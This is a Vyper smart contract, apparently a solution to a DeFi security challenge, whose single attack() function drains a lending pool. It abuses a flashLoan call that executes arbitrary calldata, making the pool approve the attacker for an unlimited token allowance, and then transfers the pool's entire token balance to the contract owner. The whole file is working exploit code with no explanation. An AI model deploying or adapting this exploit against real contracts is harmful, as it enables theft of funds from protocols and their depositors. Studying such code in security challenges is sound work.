# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

owner: immutable(address)

pool: address
token: address

@external
@payable
def __init__(_pool: address, _token: address):
    owner = msg.sender
    self.pool = _pool
    self.token = _token

@external
def attack():
    assert msg.sender == owner, "!owner"
    all_tokens: uint256 = IERC20(self.token).balanceOf(self.pool)
    raw_call(
        self.pool,
        _abi_encode(
            empty(uint256),
            self,
            self.token,
            _abi_encode(
                self,
                max_value(uint256),
                method_id=method_id(
                    "approve(address,uint256)"
                )
            ),
            method_id=method_id(
                "flashLoan(uint256,address,address,bytes)"
            )
        )
    )
    IERC20(self.token).transferFrom(self.pool, msg.sender, all_tokens)
